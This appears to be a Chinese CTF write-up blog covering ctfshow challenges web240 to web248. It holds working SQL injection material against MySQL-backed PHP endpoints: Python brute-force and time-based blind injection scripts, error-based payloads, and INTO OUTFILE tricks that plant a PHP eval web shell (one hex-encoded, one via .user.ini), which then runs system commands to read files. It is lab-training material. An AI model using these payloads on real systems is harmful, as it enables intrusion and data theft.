&lt;h1 id=&#34;web240&#34;&gt;&lt;a href=&#34;#web240&#34; class=&#34;headerlink&#34; title=&#34;web240&#34;&gt;&lt;/a&gt;web240&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;insert注入


查询语句
  //插入数据
  $sql = &amp;quot;insert into ctfshow_user(username,pass) value(&amp;#39;&amp;#123;$username&amp;#125;&amp;#39;,&amp;#39;&amp;#123;$password&amp;#125;&amp;#39;);&amp;quot;;


返回逻辑
  ///过滤空格 or sys mysql 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;题目Hint：表名共9位，flag开头，后五位由a&amp;#x2F;b组成，如flagabaab，全小写&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以将所有情况都添加进去，最终一定会有一个正确的回显&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用脚本完成添加&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
url=&amp;quot;http://ac7e7d6c-ce76-4839-8978-14c09460b1e9.challenge.ctf.show/api/insert.php&amp;quot;
for a1 in &amp;quot;ab&amp;quot;:
    for a2 in &amp;quot;ab&amp;quot;:
        for a3 in &amp;quot;ab&amp;quot;:
            for a4 in &amp;quot;ab&amp;quot;:
                for a5 in &amp;quot;ab&amp;quot;:
                    payload=&amp;quot;flag&amp;quot;+a1+a2+a3+a4+a5
                    data=&amp;#123;
                        &amp;#39;username&amp;#39;:f&amp;quot;1&amp;#39;,(select(flag)from(&amp;#123;payload&amp;#125;)))#&amp;quot;,
                        &amp;#39;password&amp;#39;:&amp;#39;1&amp;#39;
                    &amp;#125;
                    r=requests.post(url,data=data)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903152746741.png&#34; alt=&#34;image-20250903152746741&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web241&#34;&gt;&lt;a href=&#34;#web241&#34; class=&#34;headerlink&#34; title=&#34;web241&#34;&gt;&lt;/a&gt;web241&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;delete注入


sql语句
  //删除记录
  $sql = &amp;quot;delete from  ctfshow_user where id = &amp;#123;$id&amp;#125;&amp;quot;;


返回逻辑
  //无过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903164527726.png&#34; alt=&#34;image-20250903164527726&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time

url = &amp;#39;http://dfd59311-8570-435f-b116-8d9c7ddba7e2.challenge.ctf.show/api/delete.php&amp;#39;
flag = &amp;#39;&amp;#39;
i = 0

while 1:
    i += 1
    head = 32
    tail = 127
    while head &amp;lt; tail:
        mid = (head + tail) &amp;gt;&amp;gt; 1
        # 查库名
        # payload = &amp;#39;database()&amp;#39;

        # 查表名
        # payload = &amp;#39;(select group_concat(table_name) from information_schema.tables where table_schema=database())&amp;#39;

        # 查列名
        # payload = &amp;quot;(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;flag&amp;#39;)&amp;quot;

        # 查flag
        payload = &amp;#39;(select flag from flag)&amp;#39;

        data = &amp;#123;
            &amp;#39;id&amp;#39;:f&amp;quot;if(ascii(substr(&amp;#123;payload&amp;#125;,&amp;#123;i&amp;#125;,1))&amp;gt;&amp;#123;mid&amp;#125;,sleep(0.1),0)#&amp;quot;
        &amp;#125;

        try:
            r = requests.post(url=url,data=data,timeout=2.1)
            tail = mid
        except Exception as e:
            head = mid + 1
        time.sleep(1)
    if head != 32:
        flag += chr(head)
    else:
        break
    time.sleep(1)
    print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web242&#34;&gt;&lt;a href=&#34;#web242&#34; class=&#34;headerlink&#34; title=&#34;web242&#34;&gt;&lt;/a&gt;web242&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;文件读写


sql语句
  //备份表
  $sql = &amp;quot;select * from ctfshow_user into outfile &amp;#39;/var/www/html/dump/&amp;#123;$filename&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //无过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;into outfile&lt;/code&gt; 的扩展选项&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;[&amp;#123;fields | columns&amp;#125;
    [terminated by &amp;#39;string&amp;#39;]       -- 列分隔符
    [[optionally] enclosed by &amp;#39;char&amp;#39;]  -- 列值用什么符号包裹
    [escaped by &amp;#39;char&amp;#39;]            -- 转义符
]
[lines
    [starting by &amp;#39;string&amp;#39;]         -- 每行开头
    [terminated by &amp;#39;string&amp;#39;]       -- 每行结尾
]	

“OPTION”参数为可选参数选项，其可能的取值有：

`FIELDS TERMINATED BY &amp;#39;字符串&amp;#39;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

`FIELDS ENCLOSED BY &amp;#39;字符&amp;#39;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

`FIELDS OPTIONALLY ENCLOSED BY &amp;#39;字符&amp;#39;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

`FIELDS ESCAPED BY &amp;#39;字符&amp;#39;`：设置转义字符，只能为单个字符。默认值为“\”。

`LINES STARTING BY &amp;#39;字符串&amp;#39;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

`LINES TERMINATED BY &amp;#39;字符串&amp;#39;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/dump.php

#POST
filename=1.php&amp;#39; fields terminated by &amp;#39;&amp;lt;?php eval($_REQUEST[1]);?&amp;gt;&amp;#39;#
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903201627802.png&#34; alt=&#34;image-20250903201627802&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/dump/1.php

#POST
1=system(&amp;quot;ls /&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903201656991.png&#34; alt=&#34;image-20250903201656991&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/dump/1.php

#POST
1=system(&amp;quot;cat /flag.here&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903201819479.png&#34; alt=&#34;image-20250903201819479&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web243&#34;&gt;&lt;a href=&#34;#web243&#34; class=&#34;headerlink&#34; title=&#34;web243&#34;&gt;&lt;/a&gt;web243&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;文件读写


sql语句
  //备份表
  $sql = &amp;quot;select * from ctfshow_user into outfile &amp;#39;/var/www/html/dump/&amp;#123;$filename&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //过滤了php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用 &lt;code&gt;.user.ini&lt;/code&gt; 文件上传&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;auto_prepend_file=1.jpg&lt;/code&gt; Hex编码后为 &lt;code&gt;0x6175746f5f70726570656e645f66696c653d312e6a7067&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为保证 &lt;code&gt;auto_prepend_file=1.jpg&lt;/code&gt; 单独一行，在字符串前后添加 &lt;code&gt;0a&lt;/code&gt; 进行换行，最终为 &lt;code&gt;0x0a6175746f5f70726570656e645f66696c653d312e6a70670a&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/dump.php

#POST
filename=.user.ini&amp;#39; lines starting by &amp;#39;;&amp;#39; terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903221809840.png&#34; alt=&#34;image-20250903221809840&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/dump.php

#POST
filename=1.jpg&amp;#39; lines starting by &amp;#39;&amp;lt;?=eval($_POST[1]);?&amp;gt;&amp;#39;#
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903221532567.png&#34; alt=&#34;image-20250903221532567&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/dump/index.php

#POST
1=system(&amp;quot;ls /&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903221633240.png&#34; alt=&#34;image-20250903221633240&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/dump/index.php

#POST
1=system(&amp;quot;cat /flag.here&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903221715881.png&#34; alt=&#34;image-20250903221715881&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;预估为非预期解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;&amp;lt;?php eval($_POST[1]);?&amp;gt;&lt;/code&gt; Hex编码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;0x3c3f706870206576616c28245f504f53545b315d293b3f3e&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/dump.php

#POST
filename=file.p\hp&amp;#39; lines starting by 3c3f706870206576616c28245f504f53545b315d293b3f3e# 
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903222456749.png&#34; alt=&#34;image-20250903222456749&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/dump/file.php

#POST
1=system(&amp;quot;cat /flag.here&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903222523856.png&#34; alt=&#34;image-20250903222523856&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web244&#34;&gt;&lt;a href=&#34;#web244&#34; class=&#34;headerlink&#34; title=&#34;web244&#34;&gt;&lt;/a&gt;web244&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;报错注入


sql语句
  //备份表
  $sql = &amp;quot;select id,username,pass from ctfshow_user where id = &amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
  //无过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;extractvalue(目标xml文档，xml路径)&lt;/code&gt; : 对XML文档进行查询的函数&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;updatexml(目标xml文档，xml路径，更新的内容)&lt;/code&gt; : 更新xml文档的函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对于 &lt;code&gt;updatexml(xml_target, xpath_expr, new_value)&lt;/code&gt;  ，如果 xpath 表达式不合法，mysql 会报错&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;错误信息里会把拼进去的字符串显示出来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果 &lt;code&gt;xpath&lt;/code&gt; 开头是字母，mysql 会把它尝试解析为 xpath 路径，因此在前面添加 &lt;code&gt;1&lt;/code&gt; 用来强制制造错误，保证结果一定出现在报错信息里&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api/?id=&amp;#39; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904095706751.png&#34; alt=&#34;image-20250904095706751&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api/?id=&amp;#39; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_flag&amp;#39;)),1)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904095838482.png&#34; alt=&#34;image-20250904095838482&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;right(str, n)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作用：取字符串 &lt;strong&gt;右边 n 个字符&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;由于报错信息长度有限，所以选择分段读取)&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api/?id=&amp;#39; or updatexml(1,(select left(flag,15) from ctfshow_flag limit 0,1),1)--+
/api/?id=&amp;#39; or updatexml(1,(select right(flag,35) from ctfshow_flag limit 0,1),1)--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904100451381.png&#34; alt=&#34;image-20250904100451381&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904100541237.png&#34; alt=&#34;image-20250904100541237&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web245&#34;&gt;&lt;a href=&#34;#web245&#34; class=&#34;headerlink&#34; title=&#34;web245&#34;&gt;&lt;/a&gt;web245&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;报错注入


sql语句
  //备份表
  $sql = &amp;quot;select id,username,pass from ctfshow_user where id = &amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
  //无过滤
  过滤updatexml
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())));--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904105242051.png&#34; alt=&#34;image-20250904105242051&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_flagsa&amp;#39;)));--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904105334612.png&#34; alt=&#34;image-20250904105334612&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39; or extractvalue(1,concat(0x7e,(select left(flag1,20) from ctfshow_flagsa)));--+
/api?id=1&amp;#39; or extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa)));--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904105543401.png&#34; alt=&#34;image-20250904105543401&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904105443894.png&#34; alt=&#34;image-20250904105443894&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web246&#34;&gt;&lt;a href=&#34;#web246&#34; class=&#34;headerlink&#34; title=&#34;web246&#34;&gt;&lt;/a&gt;web246&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;报错注入


sql语句
  //备份表
  $sql = &amp;quot;select id,username,pass from ctfshow_user where id = &amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
  //无过滤
  过滤updatexml extractvalue
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;floor(x)&lt;/code&gt; → 向下取整函数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;floor(x)&lt;/code&gt;配合 **&lt;code&gt;group by&lt;/code&gt; + &lt;code&gt;rand()&lt;/code&gt;**，能制造 &lt;strong&gt;唯一约束冲突&lt;/strong&gt;，从而触发报错&lt;/p&gt;
&lt;p&gt;关键语句结构：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;select count(*), floor(rand(0)*2) as x 
from information_schema.tables 
group by x;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;rand(0)&lt;/code&gt;：在 &lt;code&gt;group by&lt;/code&gt; 中多次调用时，返回结果可能不一样（这是 mysql 的一个 bug 特性）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;floor(rand(0)*2)&lt;/code&gt;：结果只有 &lt;code&gt;0&lt;/code&gt; 或 &lt;code&gt;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;group by x&lt;/code&gt;：分组的时候会出现 &lt;strong&gt;重复键值&lt;/strong&gt;，导致报错：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api/?id=1&amp;#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904111140674.png&#34; alt=&#34;image-20250904111140674&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api/?id=1&amp;#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&amp;#39;ctfshow_flags&amp;#39; limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904111224910.png&#34; alt=&#34;image-20250904111224910&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api/?id=1&amp;#39; union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904111327479.png&#34; alt=&#34;image-20250904111327479&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;盲注&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904112343069.png&#34; alt=&#34;image-20250904112343069&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import time
import requests

dicts = &amp;#39;0123456789abcdefghijklmnopqrstuvwxyz-_&amp;#123;&amp;#125;,&amp;#39;
flag = &amp;#39;&amp;#39;
url = &amp;#39;http://59254d5e-0251-4f4a-9348-97749b150a50.challenge.ctf.show/api/&amp;#39;

def get_flag_char(index):
    for char in dicts:
        payload = &amp;#123;
            #&amp;quot;id&amp;quot;: f&amp;quot;1&amp;#39; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&amp;#123;index&amp;#125;,1)=&amp;#39;&amp;#123;char&amp;#125;&amp;#39;,sleep(0.1),0)#&amp;quot;
            #&amp;quot;id&amp;quot;: f&amp;quot;1&amp;#39; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_flags&amp;#39;),&amp;#123;index&amp;#125;,1)=&amp;#39;&amp;#123;char&amp;#125;&amp;#39;,sleep(0.1),0)#&amp;quot;
            &amp;quot;id&amp;quot;: f&amp;quot;1&amp;#39; or if(substr((select flag2 from ctfshow_flags),&amp;#123;index&amp;#125;,1)=&amp;#39;&amp;#123;char&amp;#125;&amp;#39;,sleep(0.1),0)#&amp;quot;

        &amp;#125;
        try:
            start_time = time.time()
            r = requests.get(url=url, params=payload).text
            end_time = time.time()
            sub = end_time - start_time
            if sub &amp;gt;= 0.5:
                return char
        except requests.RequestException as e:
            print(f&amp;quot;请求失败: &amp;#123;e&amp;#125;&amp;quot;)
    return None
for i in range(1, 64):
    char = get_flag_char(i)
    if char:
        flag += char
        print(f&amp;quot;当前进度: &amp;#123;flag&amp;#125;&amp;quot;)
    else:
        print(&amp;quot;已结束&amp;quot;)
        break
print(f&amp;quot;最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web247&#34;&gt;&lt;a href=&#34;#web247&#34; class=&#34;headerlink&#34; title=&#34;web247&#34;&gt;&lt;/a&gt;web247&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;报错注入


sql语句
  //备份表
  $sql = &amp;quot;select id,username,pass from ctfshow_user where id = &amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
  //无过滤
  过滤updatexml extractvalue floor
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;floor()：向下取整&lt;/code&gt;&lt;br&gt;&lt;code&gt;ceil()：向上取整&lt;/code&gt;&lt;br&gt;&lt;code&gt;round()：四舍五入&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 MySQL 里，数据库名、表名、字段名 默认可以直接写&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为了区分保留字（某个表&amp;#x2F;字段恰好取了 &lt;code&gt;select&lt;/code&gt;、&lt;code&gt;order&lt;/code&gt;、&lt;code&gt;desc&lt;/code&gt; 等名字） 、支持特殊字符（&lt;code&gt;-&lt;/code&gt;、空格、中文、大小写敏感），则需要使用反引号 &lt;code&gt;`&lt;/code&gt; 进行包裹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL 标准：在使用 &lt;code&gt;GROUP BY&lt;/code&gt; 时，&lt;code&gt;SELECT&lt;/code&gt; 列表中的非聚合列必须出现在 &lt;code&gt;GROUP BY&lt;/code&gt; 子句中&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;count(*)&lt;/code&gt; 为聚合函数，聚合列允许不出现在 &lt;code&gt;group by&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904130208682.png&#34; alt=&#34;image-20250904130208682&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&amp;#39;ctfshow_flagsa&amp;#39; limit 1,1),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904130321168.png&#34; alt=&#34;image-20250904130321168&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39; union select 1,count(*),concat((select `flag?` from ctfshow_flagsa),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904130406274.png&#34; alt=&#34;image-20250904130406274&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web248&#34;&gt;&lt;a href=&#34;#web248&#34; class=&#34;headerlink&#34; title=&#34;web248&#34;&gt;&lt;/a&gt;web248&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;UDF注入


sql语句
  $sql = &amp;quot;select id,username,pass from ctfshow_user where id = &amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39; limit 1;&amp;quot;;


返回逻辑
  //无过滤,
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;UDF用户自定义函数&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;UDF&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;全称&lt;/strong&gt;：User Defined Function（用户自定义函数）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;用途&lt;/strong&gt;：MySQL 自带的函数有限，如果我们想让 MySQL 扩展新的功能，可以通过 &lt;strong&gt;UDF 插件&lt;/strong&gt;的方式，把自己写的函数加载进 MySQL。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;调用方式&lt;/strong&gt;：和系统函数完全一样，比如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;select version();         -- 系统函数
select mycustomfunc(123); -- 用户自定义函数
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;UDF 的实现&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;UDF 一般用 &lt;strong&gt;C 或 C++&lt;/strong&gt; 写，因为它们需要编译成 MySQL 能调用的二进制格式。&lt;/li&gt;
&lt;li&gt;在 Windows 下，UDF 文件后缀是 **&lt;code&gt;.dll&lt;/code&gt;**，在 Linux 下是 **&lt;code&gt;.so&lt;/code&gt;**。&lt;/li&gt;
